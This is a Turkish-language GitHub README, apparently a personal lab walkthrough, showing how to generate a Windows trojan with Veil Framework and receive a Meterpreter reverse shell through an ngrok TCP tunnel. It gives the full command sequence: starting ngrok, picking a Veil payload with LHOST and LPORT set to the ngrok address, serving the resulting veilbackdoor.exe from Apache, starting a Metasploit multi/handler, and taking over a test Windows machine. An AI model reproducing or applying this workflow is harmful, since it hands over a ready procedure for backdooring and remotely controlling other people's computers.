# Veil-Ngrok-Calistirma
Veil Framework ile Ngrok Çalıştırarak Trojen Oluşturup Çalıştırmak


Veil Framework Yükleme Referansı: https://github.com/Veil-Framework/Veil


- [Ngrok.com](https://ngrok.com/) adresine giderek üye oldum.
- Site üzerinden “Download for Linux” diyerek sanal Kali makinama ngrok’u indirdim
- 2. Kısımda yazan authentication token’ımı kayderek siteden çıkış yapıyorum.
 ![ngrok site](https://user-images.githubusercontent.com/67163428/191236942-63485be5-51da-4a83-bdb2-b8a87b25e0c2.png)


- Download klasörü içinde indirdiğim Zip dosyası içinden Ngrok’u çıkardım
 ![ngrok zip çıkarılış](https://user-images.githubusercontent.com/67163428/191237212-ef13070b-bab6-49c3-ac54-4f09fbcaee61.png)


- Terminal ekranını açarak Download klasörünün içine gidiyorum, ls diyerek dosyaları kontrol ediyorum ve “ngrok” dosyasını görüyorum.
- Kaydetmiş olduğum authentication tokenı ./ngrok yaparak yapıştırıp tokenın dosyaya yazılmasını sağlıyorum.
 ![ngrok token kaydetme](https://user-images.githubusercontent.com/67163428/191237348-f267496a-8a87-4d60-933c-bf556e30e2f4.png)


- ./ngrok tcp 4848 servisini çalıştırıp kullanılmayan bir port ekliyorum.
 ![ngrok çalıştırma](https://user-images.githubusercontent.com/67163428/191237409-7ee692ce-69ab-41a0-ad84-5e4545198730.png)


- Ngrok çalışmaya başladıktan sonra gelen ekran üzerinde tcp://0.tcp.eu.ngrok.io’a ya 11810 portundan gelen verileri benim makinamın 4848 portuna aktaracağını anlıyoruz.
 ![ngrok çalışması ](https://user-images.githubusercontent.com/67163428/191237456-aae6c597-4ee8-4485-b5ee-0a6034f5b3f5.png)


- Trojen yaratmak için Veil kullanıyorum.
- Veil dosyasının kurulu olduğu yere giderek, Veil.py dosyasını çalıştırmak için “python3 Veil.py” yazıyorum.
 ![veil çalıştırma](https://user-images.githubusercontent.com/67163428/191237534-4918ef2e-2da1-4b1e-9fa7-7146eb6a5094.png)


- Çıkan ekranda 2 araç kullanılabilir olduğunu görüyorum ve 1. Aracı kullanıyorum
 ![veil iç 1](https://user-images.githubusercontent.com/67163428/191237598-cb81a1b3-0737-4200-8a10-40b79f3faec8.png)


- “list” diyerek payload listelerini görüyorum.

 ![veil iç 2](https://user-images.githubusercontent.com/67163428/191237642-27d90eda-9e55-4c8c-97bc-3dd5bb2aaf65.png)
 
 ![veil iç 3](https://user-images.githubusercontent.com/67163428/191237676-251896cd-351d-45bd-ae81-c30235050540.png)


- “use 7” diyerek 7. payloadı seçerek devam ediyorum.
 ![veil iç 4](https://user-images.githubusercontent.com/67163428/191237688-1102d3b4-fceb-4026-9007-84defebcbfba.png)


-“set LHOST 0.tcp.ngrok.io” yazıyorum. Ngrok üzerinden bize verilen adresi girdim.

- Port olarakta “set LPORT 11810” giriyorum

 ![veil iç 5](https://user-images.githubusercontent.com/67163428/191237931-9790d9fe-b387-4bc5-b377-15838e8aee39.png)


-“generate” diyerek benim için oluşturmasını istiyorum daha sonra bir isim vererek dosyanın nerede oluştuğunu görebiliyorum.
 ![veil iç 6](https://user-images.githubusercontent.com/67163428/191237959-0fad0315-d39f-418e-a973-37d49feee0ff.png)


- “/var/lib/veil/output/compiled/veilbackdoor.exe” içerisinde olan dosyamı keserek 
 /var/www/html/backdoors/” klasörünün içine aktarıyorum. (backdoors klasörünü isteğe bağlı oluşturabilirsiniz)


--------------


- Apache servisimi çalıştırıyorum.
- Dinlemeyi yapmak için msfconsole içine giriyorum.
 ![apache ve msfconsole çalıştırma](https://user-images.githubusercontent.com/67163428/191238053-41d8cdc6-b95a-43cb-b25f-8a5b5a4621c4.png)


- “ use exploit/multi/handler” 
“ set payload windows/meterpreter/reverse_tcp” komutlarını giriyorum
 ![msfconsole iç 1](https://user-images.githubusercontent.com/67163428/191238141-a1f4c3d7-8a82-4bfc-af9c-4a6327dd1986.png)


- “show opitons” içine girerek LHOST VE LPORTA BAKIYORUM.
“set LHOST 0.0.0.0” VE “set LPORT 4848” yazarak düzenleme yapıyorum.
- “exploit -j -z” diyerek dinlemeyi başlatmış oluyorum.
 ![msfconsole iç 2](https://user-images.githubusercontent.com/67163428/191238171-8f9fe884-0a44-4b34-8abb-5c1f11d337e0.png)


--------------


- Oluşturduğum sanal windows makinasını çalıştırıyorum.
- Tarayıcıyı açarak “10.0.2.15/backdors” adresine giderek veilbackdoor.exe dosyasını indiriyorum.
 ![windows indirme](https://user-images.githubusercontent.com/67163428/191238393-81524185-c4fd-44db-bd01-b06b3d3ab8ca.png)


- exe dosyasını açtıktan sonra kali makinamızın terminaline bir sessions düşüyor.
 ![msfconsole 3](https://user-images.githubusercontent.com/67163428/191238361-c3a3f034-6061-45d7-af9d-f2c47448c033.png)


- “sessions -l” yaparak tüm sessionsları görüyoruz ve bize gerekli olan “sessions -1” diyerek windows makinamızın içine giriyoruz. 
- “sysinfo” yapara makinamızın ele geçirildiğini kanıtlamış oluyoruz.
 ![msfconsole 4](https://user-images.githubusercontent.com/67163428/191238381-4063fce5-c328-4225-99d7-e330c2c7c02b.png)



